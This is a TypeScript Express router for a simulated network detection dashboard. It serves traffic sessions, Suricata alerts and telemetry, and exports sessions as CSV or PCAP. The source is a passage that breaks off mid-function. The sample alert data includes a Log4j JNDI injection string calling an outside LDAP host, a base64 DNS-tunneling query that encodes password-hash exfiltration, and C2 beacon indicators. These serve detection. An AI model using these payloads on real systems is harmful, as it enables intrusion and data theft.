import express, { type Request, type Response } from 'express';
const Router = express.Router;
import fs from 'fs';
import path from 'path';
import { globalAttackSignatureEngine } from './attackSignatureEngine';

export interface TrafficSessionData {
  id: number;
  stream_id: string;
  time: string;
  src_ip: string;
  src_port: number;
  dst_ip: string;
  dst_port: number;
  proto: 'HTTPS' | 'HTTP' | 'DNS' | 'SSH' | 'SMB' | 'TLS' | 'PostgreSQL' | 'TCP' | 'UDP';
  app_proto?: string;
  bytes_in: string;
  bytes_out: string;
  total_bytes_num: number;
  packets: number;
  duration_ms: number;
  threat_level?: 'Critical' | 'High' | 'Medium' | 'Low' | 'Clean';
  threat_desc?: string;
  action: 'Allowed' | 'Blocked' | 'Rate-limited' | 'Flagged';
  geo_src?: { country: string; flag: string };
  geo_dst?: { country: string; flag: string };
  tcp_flags?: string;
  ja3_hash?: string;
  messages: Array<{
    seq: number;
    time_offset: string;
    dir: 'out' | 'in';
    msg_type: string;
    payload_preview: string;
    length: number;
  }>;
  hex_dump: Array<{
    offset: string;
    hex: string;
    ascii: string;
  }>;
  decoded_summary?: {
    protocol_stack: string[];
    details: Record<string, string>;
  };
}

export interface SuricataAlertData {
  id: string;
  timestamp: string;
  sid: number;
  rev: number;
  signature: string;
  category: string;
  severity: 'Critical' | 'High' | 'Medium' | 'Low';
  src_ip: string;
  src_port: number;
  dst_ip: string;
  dst_port: number;
  proto: string;
  action: 'Blocked (Drop)' | 'Alerted' | 'Quarantined';
  mitre_tactic: string;
  mitre_technique: string;
  cve?: string;
  payload_snippet: string;
}

export function createNdrRouter() {
  const router = Router();

  // In-memory traffic control rules
  let trafficControlRules = [
    {
      id: "tc-001",
      name: "C2 異常 Beaconing 流量限速與隔離",
      targetIp: "185.220.101.45",
      action: "isolate" as "drop" | "limit" | "isolate" | "inspect",
      rateLimitMbps: 0,
      protocol: "ALL",
      status: "active",
      createdAt: new Date(Date.now() - 3600000).toISOString(),
      matchedPackets: 18452,
      description: "Suricata IDS 與 NDR 共同命中高頻固定週期的 C2 逆向連線，實施雙向硬阻斷。"
    },
    {
      id: "tc-002",
      name: "DNS 隧道高頻查詢抑制 (QoS)",
      targetIp: "10.88.88.102",
      action: "limit" as "drop" | "limit" | "isolate" | "inspect",
      rateLimitMbps: 2,
      protocol: "UDP 53",
      status: "active",
      createdAt: new Date(Date.now() - 7200000).toISOString(),
      matchedPackets: 92841,
      description: "對內網主機實施 DNS 頻寬塑形，防止利用子域名編碼進行大量資料外洩。"
    },
    {
      id: "tc-003",
      name: "外部惡意掃描來源阻絕",
      targetIp: "198.51.100.89",
      action: "drop" as "drop" | "limit" | "isolate" | "inspect",
      rateLimitMbps: 0,
      protocol: "TCP 80, 443",
      status: "active",
      createdAt: new Date(Date.now() - 14400000).toISOString(),
      matchedPackets: 4210,
      description: "針對荷蘭出口節點探測 Log4j JNDI Exploit 的惡意請求直接於邊界丟棄。"
    }
  ];

  // In-memory live sessions dataset
  let sessions: TrafficSessionData[] = [
    {
      id: 1,
      stream_id: 'STR-994201',
      time: '12:31:05',
      src_ip: '10.88.88.106',
      src_port: 51240,
      dst_ip: '185.220.101.45',
      dst_port: 443,
      proto: 'HTTPS',
      app_proto: 'TLS v1.3 (JA3: 771,4865-4866-4867,43-51-10,29-23)',
      bytes_in: '12.4 KB',
      bytes_out: '3.8 KB',
      total_bytes_num: 16200,
      packets: 48,
      duration_ms: 320,
      threat_level: 'Critical',
      threat_desc: 'Lazarus APT Known C2 Encrypted Channel over TLS',
      action: 'Blocked',
      geo_src: { country: 'LAN (Corp)', flag: '🏢' },
      geo_dst: { country: 'Russia (RU)', flag: '🇷🇺' },
      tcp_flags: 'SYN, ACK, PSH, FIN',
      ja3_hash: 'ada70206e40642a3e4461f35503241d5',
      messages: [
        { seq: 1, time_offset: '+0.000 ms', dir: 'out', msg_type: 'TCP SYN', payload_preview: '[SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256', length: 54 },
        { seq: 2, time_offset: '+18.2 ms', dir: 'in', msg_type: 'TCP SYN-ACK', payload_preview: '[SYN, ACK] Seq=0 Ack=1 Win=65535 Len=0', length: 54 },
        { seq: 3, time_offset: '+18.4 ms', dir: 'out', msg_type: 'TLS Client Hello', payload_preview: 'Handshake: Client Hello, TLS 1.3, SNI: "dark-c2-tunnel.onion.to"', length: 512 },
        { seq: 4, time_offset: '+37.1 ms', dir: 'in', msg_type: 'TLS Server Hello', payload_preview: 'Handshake: Server Hello, Change Cipher Spec, Encrypted Extensions', length: 1420 },
        { seq: 5, time_offset: '+42.0 ms', dir: 'out', msg_type: 'Application Data (Encrypted)', payload_preview: '[Encrypted C2 Beacon Heartbeat, IV=0x9f81a]', length: 256 }
      ],
      hex_dump: [
        { offset: '0000', hex: '16 03 01 02 00 01 00 01 fc 03 03 a1 b2 c3 d4 e5 f6', ascii: '................' },
        { offset: '0010', hex: '00 00 20 74 65 73 74 2d 63 32 2d 62 65 61 63 6f', ascii: '.. test-c2-beaco' },
        { offset: '0020', hex: '6e 2e 6f 6e 69 6f 6e 2e 74 6f 00 2b 00 03 02 03', ascii: 'n.onion.to.+....' },
        { offset: '0030', hex: '04 00 33 00 26 00 24 00 1d 00 20 9f 86 d0 81 88', ascii: '..3.&.$... .....' }
      ],
      decoded_summary: {
        protocol_stack: ['Ethernet II', 'IPv4 (10.88.88.106 -> 185.220.101.45)', 'TCP (51240 -> 443)', 'TLSv1.3'],
        details: {
          'Server Name Indication (SNI)': 'dark-c2-tunnel.onion.to',
          'Cipher Suite': 'TLS_AES_256_GCM_SHA384 (0x1302)',
          'Supported Groups': 'x25519 (0x001d), secp256r1 (0x0017)',
          'JA3 Fingerprint': 'ada70206e40642a3e4461f35503241d5',
          'JA3S Fingerprint': 'ec74a5c5110605f9f8eac84b7252e1fb'
        }
      }
    },
    {
      id: 2,
      stream_id: 'STR-994202',
      time: '12:30:48',
      src_ip: '10.88.88.102',
      src_port: 54102,
      dst_ip: '8.8.8.8',
      dst_port: 53,
      proto: 'DNS',
      app_proto: 'DNS over UDP (Base64 Tunneling)',
      bytes_in: '1.4 KB',
      bytes_out: '8.9 KB',
      total_bytes_num: 10300,
      packets: 24,
      duration_ms: 110,
      threat_level: 'High',
      threat_desc: 'High Entropy DNS Data Exfiltration Tunnel',
      action: 'Blocked',
      geo_src: { country: 'LAN (Corp)', flag: '🏢' },
      geo_dst: { country: 'United States (US)', flag: '🇺🇸' },
      tcp_flags: 'N/A (UDP)',
      messages: [
        { seq: 1, time_offset: '+0.000 ms', dir: 'out', msg_type: 'DNS Query (TXT)', payload_preview: 'TXT dHNoYWRvd19wYXNzd29yZF9oYXNoX2V4Zmls.tunnel.ns.org', length: 120 },
        { seq: 2, time_offset: '+12.4 ms', dir: 'in', msg_type: 'DNS Response', payload_preview: 'TXT "ACK_CHUNK_01_OK"', length: 90 }
      ],
      hex_dump: [
        { offset: '0000', hex: 'a1 b2 01 00 00 01 00 00 00 00 00 00 24 64 54 4e', ascii: '............$dTN' },
        { offset: '0010', hex: '6f 59 57 52 76 64 31 39 77 59 58 4e 7a 64 32 39', ascii: 'oYWRvd19wYXNzd29' },
        { offset: '0020', hex: '79 5a 46 39 6f 59 58 4e 6f 06 74 75 6e 6e 65 6c', ascii: 'yZF9oYXNo.tunnel' }
      ],
      decoded_summary: {
        protocol_stack: ['Ethernet II', 'IPv4 (10.88.88.102 -> 8.8.8.8)', 'UDP (54102 -> 53)', 'DNS Query'],
        details: {
          'Query Record Type': 'TXT (Text Record)',
          'Query Domain': 'dHNoYWRvd19wYXNzd29yZF9oYXNoX2V4Zmls.tunnel.ns.org',
          'Payload Entropy': '4.89 (Abnormally High Entropy)',
          'Decoded String': 'tshadow_password_hash_exfil'
        }
      }
    },
    {
      id: 3,
      stream_id: 'STR-994203',
      time: '12:29:15',
      src_ip: '198.51.100.89',
      src_port: 48911,
      dst_ip: '10.88.88.201',
      dst_port: 80,
      proto: 'HTTP',
      app_proto: 'HTTP/1.1 (Log4j JNDI Injection)',
      bytes_in: '420 B',
      bytes_out: '1.8 KB',
      total_bytes_num: 2220,
      packets: 12,
      duration_ms: 85,
      threat_level: 'Critical',
      threat_desc: 'CVE-2021-44228 Apache Log4j JNDI RCE Exploit in User-Agent',
      action: 'Blocked',
      geo_src: { country: 'Netherlands (NL)', flag: '🇳🇱' },
      geo_dst: { country: 'DMZ Server', flag: '🛡️' },
      tcp_flags: 'SYN, ACK, PSH',
      messages: [
        { seq: 1, time_offset: '+0.000 ms', dir: 'out', msg_type: 'HTTP GET Request', payload_preview: 'GET /login HTTP/1.1, User-Agent: ${jndi:ldap://198.51.100.89:1389/Exploit}', length: 280 },
        { seq: 2, time_offset: '+1.2 ms', dir: 'in', msg_type: 'HTTP 403 Forbidden', payload_preview: 'HTTP/1.1 403 Forbidden (Blocked by WAF/Suricata)', length: 180 }
      ],
      hex_dump: [
        { offset: '0000', hex: '47 45 54 20 2f 6c 6f 67 69 6e 20 48 54 54 50 2f', ascii: 'GET /login HTTP/' },
        { offset: '0010', hex: '31 2e 31 0d 0a 55 73 65 72 2d 41 67 65 6e 74 3a', ascii: '1.1..User-Agent:' },
        { offset: '0020', hex: '20 24 7b 6a 6e 64 69 3a 6c 64 61 70 3a 2f 2f 31', ascii: ' ${jndi:ldap://1' },
        { offset: '0030', hex: '39 38 2e 35 31 2e 31 30 30 2e 38 39 3a 31 33 38', ascii: '98.51.100.89:138' }
      ],
      decoded_summary: {
        protocol_stack: ['Ethernet II', 'IPv4 (198.51.100.89 -> 10.88.88.201)', 'TCP (48911 -> 80)', 'HTTP/1.1'],
        details: {
          'HTTP Method': 'GET',
          'Request URI': '/login',
          'Exploit Header': 'User-Agent: ${jndi:ldap://198.51.100.89:1389/Exploit}',
          'Target Vulnerability': 'Apache Log4j2 JNDI Remote Code Execution (CVE-2021-44228)'
        }
      }
    },
    {
      id: 4,
      stream_id: 'STR-994204',
      time: '12:27:30',
      src_ip: '10.88.88.202',
      src_port: 58912,
      dst_ip: '10.88.88.200',
      dst_port: 5432,
      proto: 'PostgreSQL',
      app_proto: 'PostgreSQL Backend Protocol v3.0',
      bytes_in: '45.2 MB',
      bytes_out: '120.4 MB',
      total_bytes_num: 165600000,
      packets: 12400,
      duration_ms: 4500,
      threat_level: 'Clean',
      threat_desc: 'Normal Database Replication Cluster Synchronization',
      action: 'Allowed',
      geo_src: { country: 'Server Farm', flag: '🏢' },
      geo_dst: { country: 'Database Master', flag: '🗄️' },
      tcp_flags: 'ACK, PSH',
      messages: [
        { seq: 1, time_offset: '+0.000 ms', dir: 'out', msg_type: 'StartupMessage', payload_preview: 'protocol_version=3.0, user=repl_user, database=postgres', length: 128 },
        { seq: 2, time_offset: '+0.8 ms', dir: 'in', msg_type: 'AuthenticationOk', payload_preview: 'Auth Type: SCRAM-SHA-256 Passed', length: 64 },
        { seq: 3, time_offset: '+1.5 ms', dir: 'out', msg_type: 'START_REPLICATION', payload_preview: 'START_REPLICATION SLOT "slot_node2" LOGICAL 0/1600000', length: 96 }
      ],
      hex_dump: [
        { offset: '0000', hex: '00 00 00 54 00 03 00 00 75 73 65 72 00 72 65 70', ascii: '...T....user.rep' },
        { offset: '0010', hex: '6c 5f 75 73 65 72 00 64 61 74 61 62 61 73 65 00', ascii: 'l_user.database.' },
        { offset: '0020', hex: '70 6f 73 74 67 72 65 73 00 00 00 00 00 00 00 00', ascii: 'postgres........' }
      ],
      decoded_summary: {
        protocol_stack: ['Ethernet II', 'IPv4 (10.88.88.202 -> 10.88.88.200)', 'TCP (58912 -> 5432)', 'PostgreSQL v3.0'],
        details: {
          'Database User': 'repl_user',
          'Database Name': 'postgres',
          'Replication Slot': 'slot_node2',
          'Stream Status': 'STREAMING_SYNCHRONIZED'
        }
      }
    },
    {
      id: 5,
      stream_id: 'STR-994205',
      time: '12:25:10',
      src_ip: '172.16.0.50',
      src_port: 42100,
      dst_ip: '10.88.88.254',
      dst_port: 22,
      proto: 'SSH',
      app_proto: 'SSH-2.0-OpenSSH_8.9',
      bytes_in: '18.4 KB',
      bytes_out: '12.1 KB',
      total_bytes_num: 30500,
      packets: 142,
      duration_ms: 12000,
      threat_level: 'Medium',
      threat_desc: 'Multiple SSH Failed Auth Attempts (Brute Force Pattern)',
      action: 'Rate-limited',
      geo_src: { country: 'Guest WiFi DMZ', flag: '📶' },
      geo_dst: { country: 'Core Switch', flag: '🔀' },
      tcp_flags: 'SYN, ACK, PSH',
      messages: [
        { seq: 1, time_offset: '+0.000 ms', dir: 'out', msg_type: 'SSH Protocol Init', payload_preview: 'SSH-2.0-libssh2_1.10.0', length: 32 },
        { seq: 2, time_offset: '+1.1 ms', dir: 'in', msg_type: 'SSH Protocol Resp', payload_preview: 'SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6', length: 42 },
        { seq: 3, time_offset: '+4.5 ms', dir: 'out', msg_type: 'Key Exchange Init', payload_preview: 'KEX: curve25519-sha256, HostKey: rsa-sha2-512', length: 820 },
        { seq: 4, time_offset: '+15.2 ms', dir: 'out', msg_type: 'SSH UserAuth Request', payload_preview: 'UserAuth: root (password: *******)', length: 64 },
        { seq: 5, time_offset: '+18.0 ms', dir: 'in', msg_type: 'SSH UserAuth Failure', payload_preview: 'Auth Failed: Partial=0, Allowed=publickey,password', length: 48 }
      ],
      hex_dump: [
        { offset: '0000', hex: '53 53 48 2d 32 2e 30 2d 6c 69 62 73 73 68 32 5f', ascii: 'SSH-2.0-libssh2_' },
        { offset: '0010', hex: '31 2e 31 30 2e 30 0d 0a 00 00 03 34 0a 14 9f 88', ascii: '1.10.0.....4....' },
        { offset: '0020', hex: '22 a1 84 f5 d9 81 e2 00 00 00 2c 63 75 72 76 65', ascii: '".........,curve' }
      ],
      decoded_summary: {
        protocol_stack: ['Ethernet II', 'IPv4 (172.16.0.50 -> 10.88.88.254)', 'TCP (42100 -> 22)', 'SSH-2.0'],
        details: {
          'Client Identification': 'SSH-2.0-libssh2_1.10.0',
          'Target User': 'root',
          'Authentication Method': 'Password',
          'Result': 'Authentication Failure (Rate limit enforced)'
        }
      }
    }
  ];

  // In-memory Suricata alerts dataset
  let suricataAlerts: SuricataAlertData[] = [
    {
      id: 'SUR-881',
      timestamp: '12:31:05',
      sid: 2029941,
      rev: 4,
      signature: 'ET TROJAN Lazarus APT TLS C2 Beaconing Activity',
      category: 'A Network Trojan was detected',
      severity: 'Critical',
      src_ip: '10.88.88.106',
      src_port: 51240,
      dst_ip: '185.220.101.45',
      dst_port: 443,
      proto: 'TCP',
      action: 'Blocked (Drop)',
      mitre_tactic: 'Command and Control',
      mitre_technique: 'T1071.001 Web Protocols',
      payload_snippet: 'dark-c2-tunnel.onion.to | JA3: ada70206e40642a3e4461f35503241d5'
    },
    {
      id: 'SUR-882',
      timestamp: '12:29:15',
      sid: 2034647,
      rev: 1,
      signature: 'ET EXPLOIT Possible Apache Log4j RCE (CVE-2021-44228) in User-Agent Header',
      category: 'Attempted User Privilege Gain',
      severity: 'Critical',
      src_ip: '198.51.100.89',
      src_port: 48911,
      dst_ip: '10.88.88.201',
      dst_port: 80,
      proto: 'TCP',
      action: 'Blocked (Drop)',
      mitre_tactic: 'Initial Access',
      mitre_technique: 'T1190 Exploit Public-Facing Application',
      cve: 'CVE-2021-44228',
      payload_snippet: 'User-Agent: ${jndi:ldap://198.51.100.89:1389/Exploit}'
    },
    {
      id: 'SUR-883',
      timestamp: '12:30:48',
      sid: 2018240,
      rev: 2,
      signature: 'ET INFO High-Entropy Base64 Encoded DNS Tunneling Exfiltration',
      category: 'Information Leak',
      severity: 'High',
      src_ip: '10.88.88.102',
      src_port: 54102,
      dst_ip: '8.8.8.8',
      dst_port: 53,
      proto: 'UDP',
      action: 'Blocked (Drop)',
      mitre_tactic: 'Exfiltration',
      mitre_technique: 'T1048.003 Exfiltration Over Alternative Protocol',
      payload_snippet: 'TXT: dHNoYWRvd19wYXNzd29yZF9oYXNoX2V4Zmls.tunnel.ns.org'
    },
    {
      id: 'SUR-884',
      timestamp: '12:25:10',
      sid: 2001219,
      rev: 18,
      signature: 'ET SCAN Potential SSH Brute Force Inbound Connection Attempt',
      category: 'Attempted Information Leak',
      severity: 'Medium',
      src_ip: '172.16.0.50',
      src_port: 42100,
      dst_ip: '10.88.88.254',
      dst_port: 22,
      proto: 'TCP',
      action: 'Alerted',
      mitre_tactic: 'Credential Access',
      mitre_technique: 'T1110.001 Password Guessing',
      payload_snippet: 'SSH UserAuth request user="root" count=15/minute'
    }
  ];

  // Capture engine state
  let captureState = {
    running: true,
    speedMs: 3000,
    afPacketRingBuffer: 'Active (Zero-Copy 4GB)',
    interface: 'eth0 (Mirror-Tap0)',
    zeroDrop: true,
    lastRefreshedAt: new Date().toISOString()
  };

  // Suricata engine state
  let suricataState = {
    version: 'Suricata 7.0.4 RELEASE',
    activeRules: 68419,
    lastSyncTime: new Date(Date.now() - 7200000).toISOString(),
    workerThreads: 16,
    hyperscanJIT: true,
    ipsInlineMode: true,
    packetDropRatePct: 0.00,
    zeekAnalyzers: {
      tlsLogs: 45210,
      dnsQueries: 18400,
      httpStreams: 8920,
      smbAudits: 3410
    }
  };

  // 1. NDR Real-time Telemetry Overview
  router.get('/telemetry', (req: Request, res: Response) => {
    const now = Date.now();
    const throughputMbps = Number((1850 + Math.sin(now / 5000) * 120 + Math.random() * 30).toFixed(1));
    const pps = Number((1.24 + Math.sin(now / 7000) * 0.08).toFixed(2));
    const eps = Math.floor(940000 + Math.sin(now / 4000) * 25000);
    const activeSessionsCount = 58420 + Math.floor(Math.sin(now / 10000) * 450);

    const criticalAlertsCount = suricataAlerts.filter(a => a.severity === 'Critical').length;
    const totalAlertsCount = suricataAlerts.length;

    res.json({
      success: true,
      timestamp: new Date().toISOString(),
      captureState,
      throughput: {
        currentMbps: throughputMbps,
        currentGbps: Number((throughputMbps / 1000).toFixed(2)),
        peakMbps: 2420.0,
        currentPps: `${pps}M pps`,
        currentEps: `${(eps / 1000).toFixed(0)}k EPS`,
        activeFlows: activeSessionsCount,
        tcpRetransmitRatePct: Number((0.18 + Math.random() * 0.05).toFixed(2)),
        zeroWindowDrops: 0,
        aggregationLoadPct: 4.6
      },
      storage: {
        usedTB: 14.2,
        totalTB: 20.0,
        usagePct: 71,
        retentionDays: 45
      },
      alertsSummary: {
        total: totalAlertsCount,
        critical: criticalAlertsCount,
        high: suricataAlerts.filter(a => a.severity === 'High').length,
        medium: suricataAlerts.filter(a => a.severity === 'Medium').length
      },
      protocols: [
        { name: "TLS 1.3 / HTTPS", percentage: 54.2, mbps: Number((throughputMbps * 0.542).toFixed(1)), color: "#06b6d4" },
        { name: "QUIC / HTTP3", percentage: 18.5, mbps: Number((throughputMbps * 0.185).toFixed(1)), color: "#6366f1" },
        { name: "DNS (UDP 53 / DoT)", percentage: 11.4, mbps: Number((throughputMbps * 0.114).toFixed(1)), color: "#a855f7" },
        { name: "SMBv3 / RPC", percentage: 8.9, mbps: Number((throughputMbps * 0.089).toFixed(1)), color: "#ec4899" },
        { name: "SSH (TCP 22)", percentage: 4.1, mbps: Number((throughputMbps * 0.041).toFixed(1)), color: "#f59e0b" },
        { name: "Other (ICMP / SNMP)", percentage: 2.9, mbps: Number((throughputMbps * 0.029).toFixed(1)), color: "#10b981" }
      ]
    });
  });

  // 2. Query / Filter Captured Sessions (BPF / Wireshark search & pagination)
  router.get('/sessions', (req: Request, res: Response) => {
    const { query, proto, threat_level, limit, offset } = req.query;

    let filtered = [...sessions];

    if (proto && proto !== 'ALL') {
      filtered = filtered.filter(s => s.proto.toLowerCase() === String(proto).toLowerCase());
    }

    if (threat_level && threat_level !== 'ALL') {
      filtered = filtered.filter(s => s.threat_level?.toLowerCase() === String(threat_level).toLowerCase());
    }

    if (query && typeof query === 'string' && query.trim()) {
      const q = query.trim().toLowerCase();
      // Handle simple BPF terms like 'ip.addr == ...' or plain substring search
      filtered = filtered.filter(s => {
        const rawString = `${s.src_ip} ${s.src_port} ${s.dst_ip} ${s.dst_port} ${s.proto} ${s.app_proto || ''} ${s.stream_id} ${s.threat_desc || ''}`.toLowerCase();
        
        // Exact IP or substring match
        if (rawString.includes(q)) return true;

        // Wireshark BPF syntax token checks
        if (q.includes('ip.addr') || q.includes('ip.src') || q.includes('ip.dst')) {
          const matchIp = q.match(/\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b/);
          if (matchIp && (s.src_ip.includes(matchIp[0]) || s.dst_ip.includes(matchIp[0]))) return true;
        }

        if (q.includes('tcp.port') || q.includes('udp.port') || q.includes('port')) {
          const matchPort = q.match(/\b\d{2,5}\b/);
          if (matchPort && (String(s.src_port) === matchPort[0] || String(s.dst_port) === matchPort[0])) return true;
        }

        return false;
      });
    }

    const total = filtered.length;
    const offsetNum = Number(offset) || 0;
    const limitNum = Number(limit) || 100;
    const paginated = filtered.slice(offsetNum, offsetNum + limitNum);

    res.json({
      success: true,
      total,
      count: paginated.length,
      offset: offsetNum,
      limit: limitNum,
      sessions: paginated
    });
  });

  // Purge simulated traffic sessions and Suricata alerts
  router.post('/clear-traffic', (_req: Request, res: Response) => {
    sessions = [];
    suricataAlerts = [];
    res.json({
      success: true,
      message: 'NDR 全流量深包會話與 Suricata 模擬警報已全數清空，就緒於實體鏡像流量採集'
    });
  });

  // 2.1 Export Filtered Sessions as CSV or PCAP
  router.get('/export', (req: Request, res: Response) => {
    const { format = 'csv', query, proto, threat_level, ids, filename } = req.query;

    let targetSessions = [...sessions];

    if (ids && typeof ids === 'string') {
      const idList = ids.split(',').map(s => Number(s.trim())).filter(n => !isNaN(n));
      if (idList.length > 0) {
        targetSessions = targetSessions.filter(s => idList.includes(s.id));
      }
    }

    if (proto && proto !== 'ALL') {
      targetSessions = targetSessions.filter(s => s.proto.toLowerCase() === String(proto).toLowerCase());
    }

    if (threat_level && threat_level !== 'ALL') {
      targetSessions = targetSessions.filter(s => s.threat_level?.toLowerCase() === String(threat_level).toLowerCase());
    }

    if (query && typeof query === 'string' && query.trim()) {
      const q = query.trim().toLowerCase();
      targetSessions = targetSessions.filter(s => {
        const rawString = `${s.src_ip} ${s.src_port} ${s.dst_ip} ${s.dst_port} ${s.proto} ${s.app_proto || ''} ${s.stream_id} ${s.threat_desc || ''}`.toLowerCase();
        if (rawString.includes(q)) return true;
        if (q.includes('ip.addr') || q.includes('ip.src') || q.includes('ip.dst')) {
          const matchIp = q.match(/\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b/);
          if (matchIp && (s.src_ip.includes(matchIp[0]) || s.dst_ip.includes(matchIp[0]))) return true;
        }
        if (q.includes('tcp.port') || q.includes('udp.port') || q.includes('port')) {
          const matchPort = q.match(/\b\d{2,5}\b/);
          if (matchPort && (String(s.src_port) === matchPort[0] || String(s.dst_port) === matchPort[0])) return true;
        }
        return false;
      });
    }

    const timestamp = new Date().toISOString().replace(/[-:T]/g, '').slice(0, 14);

    if (format === 'csv') {
      const headers = [
        'Session_ID',
        'Stream_ID',
        'Timestamp',
        'Source_IP',
        'Source_Port',
        'Destination_IP',
        'Destination_Port',
        'Transport_Protocol',
        'Application_Protocol',
        'TCP_Flags',
        'JA3_Fingerprint',
        'Bytes_In',
        'Bytes_Out',
        'Total_Bytes_Num',
        'Packets_Count',
        'Duration_ms',
        'Threat_Level',
        'Threat_Description',
        'Enforcement_Action',
        'Source_Country',
        'Destination_Country',
        'Messages_Count',
        'Payload_Synopsis'
      ];

      const escapeCsv = (val: any): string => {
        if (val === null || val === undefined) return '';
        const str = String(val);
        if (str.includes(',') || str.includes('"') || str.includes('\n') || str.includes('\r')) {
          return `"${str.replace(/"/g, '""')}"`;
        }
        return str;
      };

      const rows = targetSessions.map(s => {
        let payloadSynopsis = '';
        if (s.messages && Array.isArray(s.messages) && s.messages.length > 0) {
          payloadSynopsis = s.messages
            .map((m: any) => `[${m.dir === 'out' ? 'OUT' : 'IN'}:${m.msg_type || 'DATA'}] ${m.payload_preview || ''}`)
            .join(' | ');
        } else if (s.decoded_summary?.protocol_stack) {
          payloadSynopsis = `Stack: ${s.decoded_summary.protocol_stack.join(' > ')}`;
        } else if (s.hex_dump && Array.isArray(s.hex_dump) && s.hex_dump.length > 0) {
          payloadSynopsis = s.hex_dump.map((h: any) => h.ascii || '').filter(Boolean).join(' ');
        }

        const geoSrc = s.geo_src ? `${s.geo_src.country || ''} ${s.geo_src.flag || ''}`.trim() : '';
        const geoDst = s.geo_dst ? `${s.geo_dst.country || ''} ${s.geo_dst.flag || ''}`.trim() : '';
        const msgCount = s.messages && Array.isArray(s.messages) ? s.messages.length : (s.packets || 0);

        return [
          escapeCsv(s.id),
          escapeCsv(s.stream_id),
          escapeCsv(s.time || ''),
          escapeCsv(s.src_ip),
          escapeCsv(s.src_port),
          escapeCsv(s.dst_ip),
          escapeCsv(s.dst_port),
          escapeCsv(s.proto),
          escapeCsv(s.app_proto || s.proto),
          escapeCsv(s.tcp_flags || ''),
          escapeCsv((s as any).ja3_hash || ''),
          escapeCsv(s.bytes_in || '0 B'),
          escapeCsv(s.bytes_out || '0 B'),
          escapeCsv(s.total_bytes_num || 0),
          escapeCsv(s.packets || 0),
          escapeCsv(s.duration_ms || 0),
          escapeCsv(s.threat_level || 'Clean'),
          escapeCsv(s.threat_desc || 'Normal Traffic'),
          escapeCsv(s.action || 'Allowed'),
          escapeCsv(geoSrc),
          escapeCsv(geoDst),
          escapeCsv(msgCount),
          escapeCsv(payloadSynopsis)
        ].join(',');
      });

      const csvContent = '\uFEFF' + [headers.join(','), ...rows].join('\r\n');
      const exportName = filename && typeof filename === 'string'
        ? (filename.endsWith('.csv') ? filename : `${filename}.csv`)
        : `semor_flows_${targetSessions.length}sessions_${timestamp}.csv`;

      res.setHeader('Content-Type', 'text/csv; charset=utf-8');
      res.setHeader('Content-Disposition', `attachment; filename="${exportName}"`);
      return res.send(csvContent);
    }

    // Default to PCAP binary export
    const exportName = filename && typeof filename === 'string'
      ? (filename.endsWith('.pcap') ? filename : `${filename}.pcap`)
      : `semor_capture_${targetSessions.length}sessions_${timestamp}.pcap`;

    const pcapHeader = Buffer.alloc(24);
    pcapHeader.writeUInt32LE(0xa1b2c3d4, 0); // Magic Number (microsecond resolution)
    pcapHeader.writeUInt16LE(2, 4);          // Major Version
    pcapHeader.writeUInt16LE(4, 6);          // Minor Version
    pcapHeader.writeInt32LE(0, 8);           // Thiszone (GMT)
    pcapHeader.writeUInt32LE(0, 12);         // Sigfigs
    pcapHeader.writeUInt32LE(65535, 16);     // Snaplen
    pcapHeader.writeUInt32LE(1, 20);         // LinkType: 1 (Ethernet)

    const packetBuffers: Buffer[] = [pcapHeader];
    const baseTime = Math.floor(Date.now() / 1000) - (targetSessions.length * 30);

    targetSessions.forEach((s, idx) => {
      const pktTime = baseTime + (idx * 15);
      const isUdp = s.proto === 'DNS' || s.proto === 'UDP';
      const ipProto = isUdp ? 17 : 6;

      const parseIp = (ipStr: string) => {
        const parts = ipStr.split('.').map(n => parseInt(n.trim(), 10));
        return (parts.length === 4 && parts.every(n => !isNaN(n))) ? parts : [10, 0, 0, 1];
      };
      const srcBytes = parseIp(s.src_ip);
      const dstBytes = parseIp(s.dst_ip);

      const payloadStr = s.messages && s.messages.length > 0
        ? s.messages[0].payload_preview || `DATA ${s.proto}`
        : `${s.proto} stream ${s.stream_id}`;
      const payloadBuf = Buffer.from(payloadStr);

      const l4Len = isUdp ? 8 : 20;
      const ipLen = 20 + l4Len + payloadBuf.length;
      const frameLen = 14 + ipLen;

      const recHeader = Buffer.alloc(16);
      recHeader.writeUInt32LE(pktTime, 0);
      recHeader.writeUInt32LE(123456, 4);
      recHeader.writeUInt32LE(frameLen, 8);
      recHeader.writeUInt32LE(frameLen, 12);

      const ethHeader = Buffer.alloc(14);
      ethHeader.set([0x00, 0x50, 0x56, 0xc0, 0x00, 0x01], 0);
      ethHeader.set([0x00, 0x0c, 0x29, 0x88, 0x77, 0x66], 6);
      ethHeader.writeUInt16BE(0x0800, 12);

      const ipHeader = Buffer.alloc(20);
      ipHeader[0] = 0x45;
      ipHeader[1] = 0x00;
      ipHeader.writeUInt16BE(ipLen, 2);
      ipHeader.writeUInt16BE(1000 + idx, 4);
      ipHeader.writeUInt16BE(0x4000, 6);
      ipHeader[8] = 64;
      ipHeader[9] = ipProto;
      ipHeader.set(srcBytes, 12);
      ipHeader.set(dstBytes, 16);

      const l4Header = Buffer.alloc(l4Len);
      l4Header.writeUInt16BE(s.src_port, 0);
      l4Header.writeUInt16BE(s.dst_port, 2);
      if (isUdp) {
        l4Header.writeUInt16BE(8 + payloadBuf.length, 4);
      } else {
        l4Header.writeUInt32BE(100000 + idx, 4);
        l4Header.writeUInt32BE(200000 + idx, 8);
        l4Header[12] = 0x50;
        l4Header[13] = 0x18;
        l4Header.writeUInt16BE(64240, 14);
      }

      packetBuffers.push(recHeader, ethHeader, ipHeader, l4Header, payloadBuf);
    });

    const fullBinary = Buffer.concat(packetBuffers);
    res.setHeader('Content-Type', 'application/vnd.tcpdump.pcap');
    res.setHeader('Content-Disposition', `attachment; filename="${exportName}"`);
    return res.send(fullBinary);
  });

  // 3. Get Specific Session Details
  router.get('/sessions/:id', (req: Request, res: Response) => {
    const id = Number(req.params.id);
    const session = sessions.find(s => s.id === id);
    if (!session) {
      return res.status(404).json({ error: 'Session not found' });
    }
    res.json({ success: true, session });
  });

  // 4. Add / Inject Live Traffic Session
  router.post('/sessions', (req: Request, res: Response) => {
    const newSession: TrafficSessionData = {
      id: sessions.length ? Math.max(...sessions.map(s => s.id)) + 1 : 1,
      stream_id: req.body.stream_id || `STR-${Date.now().toString().slice(-6)}`,
      time: new Date().toTimeString().slice(0, 8),
      src_ip: req.body.src_ip || '10.88.88.110',
